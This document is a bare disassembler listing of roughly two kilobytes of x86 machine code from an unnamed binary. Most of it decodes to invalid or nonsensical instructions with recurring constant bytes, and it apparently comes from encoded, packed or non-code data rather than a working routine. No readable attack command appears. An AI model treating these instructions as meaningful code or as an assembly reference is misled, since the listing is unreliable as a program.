  434b57:	or     al,0x5f
  434b59:	popa   
  434b5a:	popa   
  434b5b:	fcomp  DWORD PTR [ebx-0x56]
  434b5e:	arpl   WORD PTR [edx+0x62],sp
  434b61:	popa   
  434b62:	and    edx,esp
  434b64:	mov    ds:0xff626263,al
  434b69:	loop   0x434b6c
  434b6b:	imul   esp,DWORD PTR [ecx],0x62632ce2
  434b71:	bound  ecx,QWORD PTR [edx+eiz*8+0x1]
  434b75:	imul   esp,DWORD PTR [ecx],0x6263dae2
  434b7b:	bound  edi,QWORD PTR [edx+eiz*8]
  434b7e:	add    DWORD PTR [ecx+0x21],ebp
  434b81:	loop   0x434b49
  434b83:	arpl   WORD PTR [edx+0x62],sp
  434b86:	stc    
  434b87:	loop   0x434b8a
  434b89:	imul   esp,DWORD PTR [ecx],0x6263d2e2
  434b8f:	(bad)  
  434b90:	stc    
  434b91:	loop   0x434b94
  434b93:	imul   esp,DWORD PTR [ecx],0x6263bee2
  434b99:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  434b9f:	pop    ebx
  434ba0:	mov    fs,WORD PTR [ebx+0x62]
  434ba3:	bound  esp,QWORD PTR [ecx-0x12]
  434ba6:	lea    ecx,ds:0x62638ee2
  434bac:	bound  esp,QWORD PTR [edx+0x638ee217]
  434bb2:	bound  esp,QWORD PTR [edx-0x28]
  434bb5:	and    ecx,DWORD PTR [esi+0x3b626263]
  434bbb:	jae    0x434bbf
  434bbd:	or     eax,0x62638ee2
  434bc2:	bound  ecx,QWORD PTR ds:0x63a2e26e
  434bc8:	bound  esp,QWORD PTR [edx-0x7b]
  434bcb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434bd1:	call   0x1350ad7e
  434bd6:	mov    fs,WORD PTR [ebx+0x62]
  434bd9:	bound  edx,QWORD PTR [edi+edx*1+0x63a6cd6e]
  434be0:	bound  esp,QWORD PTR [edx-0x12]
  434be3:	adc    eax,0x63cae221
  434be8:	bound  esp,QWORD PTR [edx+0x18]
  434beb:	loop   0x434bee
  434bed:	imul   esp,DWORD PTR [ecx],0x6263b6e2
  434bf3:	bound  edi,QWORD PTR [edx+eiz*8]
  434bf6:	add    DWORD PTR [ecx+0x21],ebp
  434bf9:	loop   0x434c3b
  434bfb:	arpl   WORD PTR [edx+0x62],sp
  434bfe:	and    ah,dl
  434c00:	add    DWORD PTR [ecx+0x21],ebp
  434c03:	loop   0x434bd3
  434c05:	arpl   WORD PTR [edx+0x62],sp
  434c08:	arpl   dx,sp
  434c0a:	add    DWORD PTR [ecx+0x21],ebp
  434c0d:	loop   0x434c89
  434c0f:	arpl   WORD PTR [edx+0x62],sp
  434c12:	cmp    eax,0x216901e2
  434c17:	loop   0x434bff
  434c19:	arpl   WORD PTR [edx+0x62],sp
  434c1c:	jmp    edx
  434c1e:	add    DWORD PTR [ecx+0x21],ebp
  434c21:	loop   0x434c0e
  434c23:	arpl   WORD PTR [edx+0x62],sp
  434c26:	cmp    al,0xe2
  434c28:	add    DWORD PTR [ecx+0x21],ebp
  434c2b:	loop   0x434c14
  434c2d:	arpl   WORD PTR [edx+0x62],sp
  434c30:	(bad)  
  434c32:	add    DWORD PTR [ecx+0x21],ebp
  434c35:	loop   0x434c1a
  434c37:	arpl   WORD PTR [edx+0x62],sp
  434c3a:	jmp    edx
  434c3c:	add    DWORD PTR [ecx+0x21],ebp
  434c3f:	loop   0x434c20
  434c41:	arpl   WORD PTR [edx+0x62],sp
  434c44:	dec    esp
  434c45:	loop   0x434c48
  434c47:	imul   esp,DWORD PTR [ecx],0x6263dbe2
  434c4d:	bound  esp,QWORD PTR [edx]
  434c4f:	loop   0x434c52
  434c51:	imul   esp,DWORD PTR [ecx],0x62636ee2
  434c57:	bound  ecx,QWORD PTR [ebp-0x1e]
  434c5a:	add    DWORD PTR [ecx+0x21],ebp
  434c5d:	loop   0x434c63
  434c5f:	arpl   WORD PTR [edx+0x62],sp
  434c62:	arpl   dx,sp
  434c64:	add    DWORD PTR [ecx+0x21],ebp
  434c67:	loop   0x434c79
  434c69:	arpl   WORD PTR [edx+0x62],sp
  434c6c:	pop    ds
  434c6d:	loop   0x434c70
  434c6f:	imul   esp,DWORD PTR [ecx],0x62630ce2
  434c75:	bound  esp,QWORD PTR [edx]
  434c77:	loop   0x434c7a
  434c79:	imul   esp,DWORD PTR [ecx],0x6263e9e2
  434c7f:	bound  esp,QWORD PTR [ebp-0x1e]
  434c82:	add    DWORD PTR [ecx+0x21],ebp
  434c85:	loop   0x434c7c
  434c87:	arpl   WORD PTR [edx+0x62],sp
  434c8a:	cmp    al,0xe2
  434c8c:	add    DWORD PTR [ecx+0x21],ebp
  434c8f:	loop   0x434c92
  434c91:	arpl   WORD PTR [edx+0x62],sp
  434c94:	cmp    al,0xe2
  434c96:	add    DWORD PTR [ecx+0x21],ebp
  434c99:	loop   0x434c98
  434c9b:	arpl   WORD PTR [edx+0x62],sp
  434c9e:	and    ah,dl
  434ca0:	add    DWORD PTR [ecx+0x21],ebp
  434ca3:	loop   0x434cf9
  434ca5:	arpl   WORD PTR [edx+0x62],sp
  434ca8:	dec    ecx
  434ca9:	loop   0x434cac
  434cab:	imul   esp,DWORD PTR [ecx],0x626324e2
  434cb1:	bound  edx,QWORD PTR [ebx-0x1e]
  434cb4:	add    DWORD PTR [ecx+0x21],ebp
  434cb7:	loop   0x434c6a
  434cb9:	arpl   WORD PTR [edx+0x62],sp
  434cbc:	push   ebx
  434cbd:	loop   0x434cc0
  434cbf:	imul   esp,DWORD PTR [ecx],0x6263ade2
  434cc5:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  434ccb:	pop    ebx
  434ccc:	sti    
  434ccd:	arpl   WORD PTR [edx+0x62],sp
  434cd0:	popa   
  434cd1:	out    dx,al
  434cd2:	lea    ecx,ds:0x6263fbe2
  434cd8:	bound  esp,QWORD PTR [edx+0x63fbe217]
  434cde:	bound  esp,QWORD PTR [edx-0x28]
  434ce1:	and    edi,ebx
  434ce3:	arpl   WORD PTR [edx+0x62],sp
  434ce6:	mov    esi,DWORD PTR [ebx-0x2c]
  434ce9:	or     eax,0x6263fbe2
  434cee:	bound  ecx,QWORD PTR ds:0x63cae26e
  434cf4:	bound  esp,QWORD PTR [edx-0x7b]
  434cf7:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434cfd:	call   0x1350aeaa
  434d02:	sti    
  434d03:	arpl   WORD PTR [edx+0x62],sp
  434d06:	add    al,0x6e
  434d08:	lea    edx,[ebx+eiz*2]
  434d0b:	bound  esp,QWORD PTR [edx-0x12]
  434d0e:	stc    
  434d0f:	adc    esp,edx
  434d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434d12:	arpl   WORD PTR [edx+0x62],sp
  434d15:	ror    BYTE PTR ds:0xdb0d2075,cl
  434d1b:	dec    eax
  434d1c:	push   0xd2626161
  434d21:	not    DWORD PTR [edi]
  434d23:	loop   0x434cbb
  434d25:	arpl   WORD PTR [edx+0x62],sp
  434d28:	adc    esp,edx
  434d2a:	adc    al,0x63
  434d2c:	bound  esp,QWORD PTR [edx-0x2e]
  434d2f:	bound  ecx,QWORD PTR [ebx]
  434d31:	xchg   esi,eax
  434d32:	arpl   WORD PTR [edx+0x62],sp
  434d35:	or     eax,0xdb0d2075
  434d3a:	dec    eax
  434d3b:	push   0xd2626161
  434d40:	call   0x6262:0x6358e217
  434d47:	adc    esp,edx
  434d49:	stos   BYTE PTR es:[edi],al
  434d4a:	arpl   WORD PTR [edx+0x62],sp
  434d4d:	ror    BYTE PTR ds:0xdb0d2075,cl
  434d53:	adc    BYTE PTR [eax+0x61],ch
  434d56:	popa   
  434d57:	bound  esi,QWORD PTR [edx+0x62]
  434d5a:	in     al,0x58
  434d5c:	arpl   WORD PTR [edx+0x62],sp
  434d5f:	fcomp  DWORD PTR [ebx+0x38]
  434d62:	arpl   WORD PTR [edx+0x62],sp
  434d65:	popa   
  434d66:	fsub   DWORD PTR [ebx]
  434d68:	stos   BYTE PTR es:[edi],al
  434d69:	arpl   WORD PTR [edx+0x62],sp
  434d6c:	popa   
  434d6d:	out    0xdf,eax
  434d6f:	or     eax,0x6263aae2
  434d74:	bound  edx,QWORD PTR [edi]
  434d76:	loop   0x434dee
  434d78:	arpl   WORD PTR [edx+0x62],sp
  434d7b:	or     eax,0xdb0d2075
  434d80:	adc    BYTE PTR [eax+0x61],ch
  434d83:	popa   
  434d84:	or     eax,0x6263aa13
  434d89:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434d8f:	out    0xfb,eax
  434d91:	or     eax,0x6263aae2
  434d96:	bound  ecx,QWORD PTR ds:0xaae21761
  434d9c:	arpl   WORD PTR [edx+0x62],sp
  434d9f:	or     eax,0x6263aae2
  434da4:	bound  esp,QWORD PTR [edi+0x626376e2]
  434daa:	bound  esi,QWORD PTR [edx-0x11a011a1]
  434db0:	dec    esi
  434db1:	or     eax,0xdb0d2075
  434db6:	adc    BYTE PTR [eax+0x61],ch
  434db9:	popa   
  434dba:	or     eax,0x6263aa13
  434dbf:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434dc5:	mov    dl,0x8e
  434dc7:	or     eax,0xdb0d2075
  434dcc:	or     al,0x68
  434dce:	popa   
  434dcf:	popa   
  434dd0:	or     eax,0x60cd0d61
  434dd5:	push   esi
  434dd6:	cdq    
  434dd7:	cmp    BYTE PTR ds:0x6263aa13,cl
  434ddd:	bound  edx,QWORD PTR [edi]
  434ddf:	cdq    
  434de0:	jbe    0x434e03
  434de2:	loop   0x434e1c
  434de4:	arpl   WORD PTR [edx+0x62],sp
  434de7:	push   0x62616161
  434dec:	mov    dl,0x20
  434dee:	bound  esi,QWORD PTR [edx+0x18b2624c]
  434df4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434df6:	xor    DWORD PTR [edx+0x62],esp
  434df9:	loop   0x434e17
  434dfb:	mov    dl,0x90
  434dfd:	lock sub BYTE PTR [eax+0x61],0x61
  434e02:	lock imul ebp,DWORD PTR [eax+0x61],0x61
  434e07:	bound  esi,QWORD PTR [edx+0x4cb26220]
  434e0d:	bound  esi,QWORD PTR [edx-0x12160ce8]
  434e13:	bound  esp,QWORD PTR [edx-0x1e]
  434e16:	sbb    al,0xb2
  434e18:	nop
  434e19:	lock arpl WORD PTR [ecx+0x61],sp
  434e1d:	popa   
  434e1e:	lock xor BYTE PTR [ecx+0x61],ah
  434e22:	popa   
  434e23:	bound  esi,QWORD PTR [edx+0x4cb26220]
  434e29:	bound  esi,QWORD PTR [edx+0x64d9f318]
  434e2f:	bound  esp,QWORD PTR [edx-0x1e]
  434e32:	sbb    al,0xb2
  434e34:	nop
  434e35:	lock ss popa 
  434e38:	popa   
  434e39:	popa   
  434e3a:	lock inc ebx
  434e3c:	popa   
  434e3d:	popa   
  434e3e:	popa   
  434e3f:	bound  esi,QWORD PTR [edx+0x18b26220]
  434e45:	repz les ebx,FWORD PTR [ebp+0x62]
  434e49:	(bad)
  434e4e:	lock push edi
  434e50:	popa   
  434e51:	popa   
  434e52:	popa   
  434e53:	lock stc 
  434e55:	popa   
  434e56:	popa   
  434e57:	popa   
  434e58:	or     eax,0xdb0d2075
  434e5d:	adc    BYTE PTR [eax+0x61],ch
  434e60:	popa   
  434e61:	or     eax,0x9aa718cd
  434e66:	mov    dl,0x76
  434e68:	adc    esi,DWORD PTR [ebp+0x28]
  434e6b:	shl    BYTE PTR [edx-0x4e],cl
  434e6e:	sub    BYTE PTR ds:0xeb626075,cl
  434e74:	mov    esi,0xd18b262
  434e79:	jne    0x434e9b
  434e7b:	or     eax,0x616848db
  434e80:	popa   
  434e81:	(bad)
  434e86:	and    BYTE PTR ds:0x616860db,cl
  434e8c:	popa   
  434e8d:	or     eax,0x9a0b8561
  434e92:	leave  
  434e93:	cmp    dh,BYTE PTR [esi+ebx*2]
  434e96:	call   0xc12ab043
  434e9b:	or     eax,0xcd0d4c75
  434ea0:	sbb    BYTE PTR [esi-0x26],dl
  434ea3:	cmp    BYTE PTR [edi],dl
  434ea5:	adc    ecx,DWORD PTR [edx+0x21626263]
  434eab:	loop   0x434f2b
  434ead:	arpl   WORD PTR [edx+0x62],sp
  434eb0:	lods   eax,DWORD PTR ds:[esi]
  434eb1:	pop    ebx
  434eb2:	add    DWORD PTR [ecx+0xd],ebp
  434eb5:	loop   0x434f35
  434eb7:	arpl   WORD PTR [edx+0x62],sp
  434eba:	test   DWORD PTR [ebx],ecx
  434ebc:	call   0xa8e8:0x5e343ac9
  434ec3:	popa   
  434ec4:	or     eax,0xf2934ccd
  434ec9:	shr    DWORD PTR [edx-0x69],1
  434ecc:	pusha  
  434ecd:	or     eax,0x17944c75
  434ed2:	fisubr DWORD PTR [edx+0x62]
  434ed5:	mov    dl,0x7e
  434ed7:	bound  esi,QWORD PTR [edx+0x18b26292]
  434edd:	(bad)  
  434ede:	in     al,0x8a
  434ee0:	arpl   WORD PTR [edx+0x62],sp
  434ee3:	pop    ss
  434ee4:	jne    0x434eee
  434ee6:	or     eax,0xdb212075
  434eeb:	pop    eax
  434eec:	push   0xe2256161
  434ef1:	add    DWORD PTR [ecx-0x12],ebp
  434ef4:	mov    cl,BYTE PTR ds:0xcd0d4c75
  434efa:	sbb    BYTE PTR [esi-0x26],dl
  434efd:	cmp    BYTE PTR [edi],dl
  434eff:	adc    edx,DWORD PTR [edx+0x62626263]
  434f05:	in     al,0x92
  434f07:	arpl   WORD PTR [edx+0x62],sp
  434f0a:	pop    ss
  434f0b:	jne    0x434f15
  434f0d:	or     eax,0xcd0d0875
  434f12:	jbe    0x434f2b
  434f14:	push   0x683c7521
  434f19:	popa   
  434f1a:	popa   
  434f1b:	popa   
  434f1c:	fsubr  st,st(2)
  434f1e:	cmp    al,0x61
  434f20:	mov    dl,0xf7
  434f22:	fcom   DWORD PTR [ebp+0x750d6118]
  434f28:	sbb    BYTE PTR [edi+0x22],dl
  434f2b:	jbe    0x434f8e
  434f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434f2e:	or     eax,0xdc9c964
  434f33:	jne    0x434ecf
  434f35:	xchg   ebx,eax
  434f36:	repnz mov ds:0x9acd0d7e,al
  434f3c:	adc    ebp,DWORD PTR [eax+ebp*2]
  434f3f:	mov    dl,BYTE PTR [edi]
  434f41:	jne    0x434f98
  434f43:	fcom   DWORD PTR [ebp+0x3aee6169]
  434f49:	or     eax,0x17a26975
  434f4e:	jne    0x434fb9
  434f50:	or     eax,0xf2939a75
  434f55:	mov    ds:0x6975a13b,al
  434f5a:	jae    0x434f04
  434f5c:	or     eax,0xcd0d5575
  434f61:	xchg   BYTE PTR [esi-0x26],dl
  434f64:	xchg   BYTE PTR [ecx-0x7e176d33],ah
  434f6a:	or     eax,0xcd0d5575
  434f6f:	xchg   BYTE PTR [esi-0x26],dl
  434f72:	xchg   BYTE PTR ds:0xda565575,cl
  434f78:	call   0xd34:0x7392cda1
  434f7f:	jne    0x434fd6
  434f81:	out    dx,al
  434f82:	lea    ecx,ds:0x1cd85575
  434f88:	cmp    BYTE PTR [edi],dl
  434f8a:	jne    0x434fe1
  434f8c:	out    dx,al
  434f8d:	sbb    eax,0x22571caf
  434f92:	xchg   BYTE PTR [ecx-0x5b],ah
  434f95:	or     eax,0xbe64d864
  434f9a:	and    DWORD PTR [ebp-0xd],esi
  434f9d:	lods   eax,DWORD PTR ds:[esi]
  434f9e:	loop   0x434fa1
  434fa0:	imul   esp,DWORD PTR [ecx],0xe2253c75
  434fa6:	add    DWORD PTR [ecx+0x21],ebp
  434fa9:	jne    0x434fc3
  434fab:	mov    bl,0xe2
  434fad:	add    DWORD PTR [ecx+0x21],ebp
  434fb0:	jne    0x434fda
  434fb2:	inc    ebp
  434fb3:	loop   0x434fb6
  434fb5:	imul   esp,DWORD PTR [ecx],0xe2655075
  434fbb:	add    DWORD PTR [ecx+0x21],ebp
  434fbe:	jne    0x435024
  434fc0:	dec    esi
  434fc1:	loop   0x434fc4
  434fc3:	imul   esp,DWORD PTR [ecx],0xe2f13175
  434fc9:	add    DWORD PTR [ecx+0x13],ebp
  434fcc:	jne    0x435016
  434fce:	pop    ss
  434fcf:	jne    0x43503a
  434fd1:	or     eax,0xcd0d6975
  434fd6:	call   0x175d:0x75139a17
  434fdd:	jne    0x435034
  434fdf:	or     eax,0xcd0d5575
  434fe4:	xchg   BYTE PTR [edi],dl
  434fe6:	call   0x9a0b:0x85f3750d
  434fed:	leave  
  434fee:	cmp    dh,BYTE PTR [esi+ebx*2]
  434ff1:	call   0x75e4b19e
  434ff6:	dec    eax
  434ff7:	xchg   ebx,eax
  434ff8:	outs   dx,BYTE PTR ds:[esi]
  434ff9:	ss pop edi
  434ffb:	popa   
  434ffc:	popa   
  434ffd:	or     eax,0xb85f375
  435002:	call   0xa8e8:0x5e343ac9
  435009:	popa   
  43500a:	mov    eax,ds:0x6e935d75
  43500f:	dec    esp
  435010:	pop    edi
  435011:	popa   
  435012:	popa   
  435013:	or     eax,0xb85f375
  435018:	call   0xa8e8:0x5e343ac9
  43501f:	popa   
  435020:	pop    ss
  435021:	jne    0x43501c
  435023:	or     eax,0xb85f375
  435028:	call   0xa8e8:0x5e343ac9
  43502f:	popa   
  435030:	pop    ss
  435031:	jne    0x43508b
  435033:	adc    esi,DWORD PTR [ebp-0x6e]
  435036:	pop    ss
  435037:	jne    0x435099
  435039:	or     eax,0xb852875
  43503e:	call   0xa8e8:0x5e343ac9
  435045:	popa   
  435046:	xchg   ebx,eax
  435047:	repnz sbb al,0xd
  43504a:	int    0x50
  43504c:	(bad)  
  43504d:	outs   dx,DWORD PTR ds:[esi]
  43504e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435054:	pop    esi
  435055:	call   0xf2d6b202
  43505a:	push   edi
  43505b:	sub    eax,0x7517941f
  435060:	dec    esp
  435061:	or     eax,0xcd0df975
  435066:	dec    eax
  435067:	xchg   esp,eax
  435068:	or     eax,0x179499f7
  43506d:	jne    0x43501c
  43506f:	or     eax,0xcd0d5875
  435074:	pop    ebp
  435075:	xchg   esp,eax
  435076:	or     eax,0x179499f7
  43507b:	jne    0x43502e
  43507d:	xchg   ebx,eax
  43507e:	bnd jne 0x43502e
  435081:	or     eax,0x6fd6f3cd
  435086:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43508c:	pop    esi
  43508d:	call   0xf2d6b23a
  435092:	push   edi
  435093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435094:	pop    ds
  435095:	mov    dl,0x87
  435097:	or     eax,0xb853c75
  43509c:	call   0xa8e8:0x5e343ac9
  4350a3:	popa   
  4350a4:	or     eax,0xba93f3cd
  4350a9:	pusha  
  4350aa:	pop    ss
  4350ab:	int    0xf3
  4350ad:	lock leave 
  4350af:	push   0xf2936161
  4350b4:	jne    0x435067
  4350b6:	or     eax,0x6fd6f3cd
  4350bb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4350c1:	pop    esi
  4350c2:	call   0xf2d6b26f
  4350c7:	push   edi
  4350c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4350c9:	pop    ds
  4350ca:	mov    dl,0x80
  4350cc:	or     eax,0xb85f375
  4350d1:	call   0x133c:0xcd0d3ac9
  4350d8:	outs   dx,BYTE PTR ds:[esi]
  4350d9:	push   0x61a8e85e
  4350de:	pop    ss
  4350df:	jne    0x43511d
  4350e1:	lock jge 0x43514c
  4350e4:	popa   
  4350e5:	popa   
  4350e6:	or     eax,0x610d6075
  4350eb:	or     eax,0x6fd6f3cd
  4350f0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4350f6:	pop    esi
  4350f7:	call   0x1feab2a4
  4350fc:	xchg   ebx,eax
  4350fd:	outs   dx,BYTE PTR ds:[esi]
  4350fe:	or     BYTE PTR [ecx+0x61],ah
  435101:	popa   
  435102:	xchg   ebx,eax
  435103:	bnd jne 0x4350b3
  435106:	xchg   ebx,eax
  435107:	repnz int 0xb1
  43510a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43510b:	pop    ds
  43510c:	xchg   ebx,eax
  43510d:	outs   dx,BYTE PTR ds:[esi]
  43510e:	add    esp,DWORD PTR [ecx+0x61]
  435111:	popa   
  435112:	xchg   ebx,eax
  435113:	bnd jne 0x4350c3
  435116:	or     eax,0x6fd650cd
  43511b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435121:	pop    esi
  435122:	call   0xf2d6b2cf
  435127:	push   edi
  435128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435129:	pop    ds
  43512a:	fistp  QWORD PTR [eax]
  43512c:	xchg   ebx,eax
  43512d:	bnd jne 0x4350dd
  435130:	or     eax,0x6fd631cd
  435135:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43513b:	pop    esi
  43513c:	call   0xf2d6b2e9
  435141:	push   edi
  435142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435143:	pop    ds
  435144:	fmul   QWORD PTR [ebx+edx*4-0x6cb38a0e]
  43514b:	repnz int 0xad
  43514e:	push   esi
  43514f:	pusha  
  435150:	xchg   esp,eax
  435151:	pop    ss
  435152:	int    0xad
  435154:	xchg   ebx,eax
  435155:	bnd jne 0x435109
  435158:	or     eax,0x6fd650cd
  43515d:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435163:	pop    esi
  435164:	call   0xf2d6b311
  435169:	push   edi
  43516a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43516b:	pop    ds
  43516c:	fistp  QWORD PTR [eax]
  43516e:	xchg   ebx,eax
  43516f:	bnd jne 0x435123
  435172:	or     eax,0x6fd631cd
  435177:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43517d:	pop    esi
  43517e:	call   0xf2d6b32b
  435183:	push   edi
  435184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435185:	pop    ds
  435186:	fmul   QWORD PTR [ebx+edx*4-0x6cb38a0e]
  43518d:	repnz int 0xb1
  435190:	push   esi
  435191:	pusha  
  435192:	xchg   esp,eax
  435193:	pop    ss
  435194:	int    0xb1
  435196:	xchg   ebx,eax
  435197:	bnd jne 0x435147
  43519a:	xchg   ebx,eax
  43519b:	repnz int 0xb1
  43519e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43519f:	pop    ds
  4351a0:	out    0x88,eax
  4351a2:	or     eax,0xb853c75
  4351a7:	call   0xa8e8:0x5e343ac9
  4351ae:	popa   
  4351af:	lock stos BYTE PTR es:[edi],al
  4351b1:	push   0x7cee6161
  4351b6:	xchg   ebx,eax
  4351b7:	bnd jne 0x435167
  4351ba:	xchg   ebx,eax
  4351bb:	repnz int 0xb1
  4351be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4351bf:	pop    ds
  4351c0:	out    0x88,eax
  4351c2:	or     eax,0xb853c75
  4351c7:	call   0xa8e8:0x5e343ac9
  4351ce:	popa   
  4351cf:	lock mov ch,BYTE PTR [eax+0x61]
  4351d3:	popa   
  4351d4:	or     eax,0xb851875
  4351d9:	call   0x1348:0xcd0d3ac9
  4351e0:	outs   dx,BYTE PTR ds:[esi]
  4351e1:	push   0x61a8e85e
  4351e6:	pop    ss
  4351e7:	jne    0x435231
  4351e9:	or     eax,0xb851875
  4351ee:	call   0x135d:0xcd0d3ac9
  4351f5:	outs   dx,BYTE PTR ds:[esi]
  4351f6:	push   0x61a8e85e
  4351fb:	pop    ss
  4351fc:	jne    0x43525b
  4351fe:	lock mov esp,0x13626263
  435204:	jne    0x43521a
  435206:	pop    ss
  435207:	jne    0x435229
  435209:	or     eax,0x5e33f975
  43520e:	call   0xbc8b3bb
  435213:	call   0x1720:0xcd0d3ac9
  43521a:	push   0x171c7513
  43521f:	jne    0x435229
  435221:	or     eax,0x5e335875
  435226:	call   0xbc8b3d3
  43522b:	call   0x1708:0xcd0d3ac9
  435232:	push   0x8514750d
  435237:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43523d:	call   0xcd50b3ea
  435242:	sbb    dh,dl
  435244:	outs   dx,DWORD PTR ds:[esi]
  435245:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43524b:	pop    esi
  43524c:	call   0xbad6b3f9
  435251:	pop    ds
  435252:	or     eax,0xf29348cd
  435257:	imul   DWORD PTR [eax+0x33]
  43525a:	pop    esi
  43525b:	call   0xbc8b408
  435260:	call   0xd61c:0xcd0d3ac9
  435267:	outs   dx,DWORD PTR ds:[esi]
  435268:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43526e:	pop    esi
  43526f:	call   0xa550b41c
  435274:	sbb    dh,dl
  435276:	or     bx,WORD PTR [edx+0x22d63ac9]
  43527d:	pop    esi
  43527e:	call   0xbad6b42b
  435283:	dec    esi
  435284:	or     eax,0xf2935da5
  435289:	xchg   BYTE PTR [eax-0x17a10f2a],dl
  43528f:	test   al,0x61
  435291:	(bad)  
  435292:	outs   dx,DWORD PTR ds:[esi]
  435293:	or     ebx,DWORD PTR [edx+0x1fa73ac9]
  435299:	mov    dl,0x2c
  43529b:	or     eax,0xb851475
  4352a0:	call   0xa8e8:0x5e343ac9
  4352a7:	popa   
  4352a8:	or     eax,0x6fd618cd
  4352ad:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4352b3:	pop    esi
  4352b4:	call   0xbad6b461
  4352b9:	pop    ds
  4352ba:	or     eax,0xf29348cd
  4352bf:	imul   DWORD PTR [eax+0x33]
  4352c2:	pop    esi
  4352c3:	call   0xbc8b470
  4352c8:	call   0xb2f3:0x75a73ac9
  4352cf:	xchg   ebx,eax
  4352d0:	or     eax,0xb85f375
  4352d5:	call   0xa8e8:0x5e343ac9
  4352dc:	popa   
  4352dd:	out    dx,al
  4352de:	lea    ecx,ds:0xb853c75
  4352e4:	call   0xa8e8:0x5e343ac9
  4352eb:	popa   
  4352ec:	push   edi
  4352ed:	and    al,BYTE PTR [esi+0x640da561]
  4352f3:	leave  
  4352f4:	leave  
  4352f5:	and    DWORD PTR [ebp+0x55],esi
  4352f8:	das    
  4352f9:	loop   0x4352fc
  4352fb:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  435301:	add    DWORD PTR [ecx+0xd],ebp
  435304:	jne    0x43536f
  435306:	test   DWORD PTR [ebx],ecx
  435308:	call   0x939a:0xcd0d3ac9
  43530f:	repnz outs dx,BYTE PTR ds:[esi]
  435311:	cdq    
  435312:	dec    ebx
  435313:	sbb    ecx,esi
  435315:	popa   
  435316:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  43531c:	repnz sbb al,0x85
  43531f:	or     bl,BYTE PTR [edx]
  435321:	popa   
  435322:	popa   
  435323:	xchg   ebx,eax
  435324:	repnz sbb al,0x9d
  435327:	xor    al,0xcc
  435329:	popa   
  43532a:	popa   
  43532b:	out    0x9f,eax
  43532d:	or     eax,0xb856975
  435332:	call   0x939a:0xcd0d3ac9
  435339:	repnz outs dx,BYTE PTR ds:[esi]
  43533b:	cdq    
  43533c:	dec    ebx
  43533d:	sbb    ecx,esi
  43533f:	popa   
  435340:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435346:	repnz sbb al,0x85
  435349:	or     bl,BYTE PTR [edx]
  43534b:	popa   
  43534c:	popa   
  43534d:	xchg   ebx,eax
  43534e:	repnz sbb al,0x9d
  435351:	mov    ecx,0xb26161cc
  435356:	cmp    ecx,DWORD PTR ds:0x75176975
  43535c:	push   ebp
  43535d:	or     eax,0xb856975
  435362:	call   0x9a0b:0x85a23ac9
  435369:	leave  
  43536a:	cmp    dl,BYTE PTR [edi]
  43536c:	jne    0x4353d7
  43536e:	out    dx,al
  43536f:	add    eax,0x2f55ead6
  435374:	loop   0x435377
  435376:	imul   esi,DWORD PTR [edx-0x658af2cc],0x750d88ee
  435380:	push   ebp
  435381:	test   DWORD PTR [ebx],ecx
  435383:	call   0x139a:0xcd0d3ac9
  43538a:	outs   dx,BYTE PTR ds:[esi]
  43538b:	cdq    
  43538c:	imul   ebx,DWORD PTR [ebx],0x225761ce
  435392:	mul    DWORD PTR [ecx-0x5b]
  435395:	or     eax,0x21c9c964
  43539a:	jne    0x4353f1
  43539c:	das    
  43539d:	loop   0x4353a0
  43539f:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  4353a5:	add    DWORD PTR [ecx+0x62],ebp
  4353a8:	mov    dl,0x9a
  4353aa:	repz cdq 
  4353ac:	bound  esp,QWORD PTR [edx+0x62]
  4353af:	pop    ss
  4353b0:	jne    0x43534c
  4353b2:	or     eax,0xb856975
  4353b7:	call   0x939a:0xcd0d3ac9
  4353be:	push   es
  4353bf:	outs   dx,BYTE PTR ds:[esi]
  4353c0:	cdq    
  4353c1:	dec    ebx
  4353c2:	sbb    ecx,esi
  4353c4:	popa   
  4353c5:	fdiv   st,st(3)
  4353c7:	call   0x61d8:0x851c1e93
  4353ce:	popa   
  4353cf:	popa   
  4353d0:	xchg   ebx,eax
  4353d1:	push   ds
  4353d2:	sbb    al,0xd8
  4353d4:	imul   esp,eax,0x750d9fe7
  4353da:	imul   eax,DWORD PTR [ebp+0x3ac99a0b],0x939acd0d
  4353e4:	repnz outs dx,BYTE PTR ds:[esi]
  4353e6:	cdq    
  4353e7:	dec    ebx
  4353e8:	sbb    ecx,esi
  4353ea:	popa   
  4353eb:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4353f1:	repnz sbb al,0x85
  4353f4:	or     bl,BYTE PTR [edx]
  4353f6:	popa   
  4353f7:	popa   
  4353f8:	xchg   ebx,eax
  4353f9:	repnz sbb al,0x9d
  4353fc:	retf   
  4353fd:	int3   
  4353fe:	popa   
  4353ff:	popa   
